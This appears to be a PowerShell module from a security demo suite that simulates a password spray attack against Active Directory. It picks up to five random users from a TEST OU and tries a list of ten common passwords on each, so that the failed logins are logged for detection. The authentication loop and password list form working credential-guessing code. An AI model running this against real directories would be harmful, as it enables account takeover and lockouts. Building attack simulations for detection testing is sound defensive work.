################################################################################
##
## DSP-Demo-Activity-07-SecurityPasswordSpray.psm1
##
## Password spray attack: select 5 users from TEST OU, try 10 passwords each
##
################################################################################

#Requires -Version 5.1
#Requires -Modules ActiveDirectory

################################################################################
# HELPER FUNCTIONS
################################################################################

function Write-Status {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $colors = @{
        'Info'    = 'White'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }
    
    $color = $colors[$Level]
    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

################################################################################
# MAIN FUNCTION
################################################################################

function Invoke-SecurityPasswordSpray {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Config,
        
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$Environment
    )
    
    Write-ActivityHeader "Security - Password Spray Attack"
    
    $sprayAttempts = 0
    $errorCount = 0
    
    $domainInfo = $Environment.DomainInfo
    $domainDN = $domainInfo.DN
    $domainFQDN = $domainInfo.FQDN
    
    # Define test passwords for spray
    $testPasswords = @(
        "Password123!",
        "Admin@123",
        "Company2024",
        "Welcome123",
        "Spring2024",
        "Test@123",
        "Temporary1",
        "Change@Me1",
        "NewPass123",
        "Demo123456"
    )
    
    try {
        # Find TEST OU
        $testOU = Get-ADOrganizationalUnit -Filter { Name -eq "TEST" } -SearchBase $domainDN -ErrorAction SilentlyContinue
        
        if (-not $testOU) {
            Write-Status "TEST OU not found" -Level Warning
            Write-Host ""
            return $true
        }
        
        Write-Status "Found TEST OU: $($testOU.DistinguishedName)" -Level Info
        
        # Get all enabled users from TEST OU
        $testUsers = Get-ADUser -Filter { Enabled -eq $true } -SearchBase $testOU.DistinguishedName -ErrorAction Stop
        
        if (-not $testUsers) {
            Write-Status "No enabled users found in TEST OU" -Level Warning
            Write-Host ""
            return $true
        }
        
        # Select up to 5 random users
        if ($testUsers -is [array]) {
            $selectedUsers = $testUsers | Get-Random -Count ([Math]::Min(5, $testUsers.Count))
        }
        else {
            $selectedUsers = @($testUsers)
        }
        
        Write-Status "Targeting $($selectedUsers.Count) user(s) with password spray" -Level Info
        Write-Host ""
        
        foreach ($user in $selectedUsers) {
            Write-Status "Spraying user: $($user.SamAccountName)" -Level Info
            
            foreach ($password in $testPasswords) {
                try {
                    # Attempt to authenticate with test password
                    $cred = New-Object System.Management.Automation.PSCredential(
                        "$domainFQDN\$($user.SamAccountName)",
                        (ConvertTo-SecureString $password -AsPlainText -Force)
                    )
                    
                    # This will fail, but the failed attempt is logged by AD
                    Add-ADGroupMember -Identity "Domain Users" -Members $user -Credential $cred -ErrorAction SilentlyContinue 2>$null
                    
                    $sprayAttempts++
                }
                catch {
                    # Expected - auth attempt failed
                    $sprayAttempts++
                }
                
                Start-Sleep -Milliseconds 100
            }
            
            Write-Status "Completed 10 attempts against $($user.SamAccountName)" -Level Success
        }
        
        Write-Host ""
        Write-Status "Completed password spray attack" -Level Success
        
        # Trigger replication
        Write-Status "Triggering replication..." -Level Info
        try {
            $dc = $domainInfo.ReplicationPartners[0]
            if ($dc) {
                Repadmin /syncall $dc /APe | Out-Null
                Start-Sleep -Seconds 3
                Write-Status "Replication triggered" -Level Success
            }
        }
        catch {
            Write-Status "Warning: Could not trigger replication: $_" -Level Warning
        }
    }
    catch {
        Write-Status "Fatal error: $_" -Level Error
        $errorCount++
    }
    
    # Summary
    Write-Host ""
    Write-Status "Spray attempts: $sprayAttempts, Errors: $errorCount" -Level Info
    
    if ($errorCount -eq 0) {
        Write-Status "Password Spray completed successfully" -Level Success
    }
    else {
        Write-Status "Password Spray completed with $errorCount error(s)" -Level Warning
    }
    
    Write-Host ""
    return $true
}

Export-ModuleMember -Function Invoke-SecurityPasswordSpray